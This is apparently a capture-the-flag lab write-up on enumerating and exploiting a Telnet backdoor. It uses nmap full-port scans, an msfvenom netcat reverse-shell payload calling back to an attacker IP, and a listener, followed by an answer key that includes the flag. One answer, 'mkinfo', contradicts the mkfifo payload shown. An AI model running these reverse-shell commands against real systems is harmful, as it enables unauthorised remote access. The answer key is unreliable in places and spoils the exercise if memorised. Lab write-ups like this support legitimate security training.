# Telnet  

Ports: 23

- *Application protocol* (largely replaced by SSH due to lack of encryption)  
- Transmits data in **clear text** (no encryption)  

**Basic Connection:**  
```bash 
telnet <ip> <port>
```  

#### Solutions:

1. What is Telnet?
```plaintext
application protocol
```

2. What has slowly replaced Telnet?
```plaintext
ssh
```

3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
```bash
telnet 10.10.10.3 23
```

4. The lack of what means that all Telnet communication is in plaintext?
```plaintext
encryption
```
---

# Enumerating Telnet  

#### Port Scanning  
```bash 
nmap -vv -Pn -p- <target ip>
```  

**Key Insight:**  
- Telnet on **non-standard ports** won’t appear in Nmap’s default top 1000 scan.  
- Always scan all ports (`-p-`) for thorough enumeration.  
- `-A` for aggressive scanning and useful NSE scripts tested

```bash
nmap -vv -A -oN scanport <target ip>
```

**Useful Resources:**  
- [CVE Details](https://www.cvedetails.com/)  
- [MITRE CVE Database](https://cve.mitre.org/)  

#### Solutions:

1. How many **ports** are open on the target machine?
```plaintext
1
```

2. What **port** is this?
```plaintext
8012
```

3. This port is unassigned, but still lists the **protocol** it's using, what protocol is this?
```plaintext
tcp
```

4. Now re-run the **nmap** scan, without the **-p-** tag, how many ports show up as open?
```plaintext
0
```
 
(This is because telnet is running on a non-standard port 8012 which is beyond the 1000 standard ports and hence won't appear in a standard nmap scan which only scans for 1000 ports)

5. Based on the title returned to us, what do we think this port could be **used for**?
```plaintext
a backdoor
```

(we can find this out by doing an aggressive scan - it returns a string which says "SKIDY'S BACKDOOR")

6. Who could it belong to? Gathering possible **usernames** is an important step in enumeration.
```plaintext
Skidy
```
---

# Exploiting Telnet  

#### Basic Access  
```bash 
telnet <ip> <port>
```  

 Understanding Shells  
- **Shell**: Code that enables command execution on a target device.  
- **Reverse Shell**: Target machine initiates a connection back to the attacker’s listening machine.  

Manual Command Execution  

Inside Telnet:  
```telnet 
.RUN <command>  # Commands must be prefixed with `.RUN`
```  

**Example: Testing Connectivity**  
1. **Attacker (Listening):**  
   ```bash 
   sudo tcpdump ip proto \\icmp -i tun0  # Monitor ICMP traffic
   ```  
2. **Telnet Session:**  
   ```telnet 
   .RUN ping [attacker_ip] -c 1  # Send ping to attacker
   ```  

**Gaining a Reverse Shell**  
###### Step 1: Generate Payload (Metasploit)  
```bash 
msfvenom -p cmd/unix/reverse_netcat lhost=[your_ip] lport=4444 R
```  
- **Output Example:**  
  ```bash 
  mkfifo /tmp/kcvzv; nc 10.23.108.250 4444 0</tmp/kcvzv | /bin/sh >/tmp/kcvzv 2>&1; rm /tmp/kcvzv
  ```  

###### Step 2: Start Listener  
```bash 
nc -lvnp 4444  # Attacker listens for connection
```  

###### Step 3: Execute Payload via Telnet  
```telnet 
.RUN mkfifo /tmp/kcvzv; nc 10.23.108.250 4444 0</tmp/kcvzv | /bin/sh >/tmp/kcvzv 2>&1; rm /tmp/kcvzv
```  

**Successful Connection:**  
![successful connection](https://github.com/user-attachments/assets/ae9bee57-01d1-41c7-8dcc-20b75c701d98)

#### Solutions:

1. What welcome message do we receive?
```plaintext
SKIDY'S BACKDOOR
```

2. Do we get a return on any input we enter into the telnet session? (Y/N)
```plaintext
N
```

3. Use the command "ping [local THM ip] -c 1" through the telnet session (prefaced with .RUN). Do we receive any pings? (Y/N)
```plaintext
Y
```

4. What word does the generated payload start with?
```plaintext
mkinfo
```

5. What would the command look like for the listening port we selected in our payload?
```bash
nc -lvnp 4444
```

6. What is the contents of flag.txt?
```plaintext
THM{y0u_g0t_th3_t3ln3t_fl4g}
```
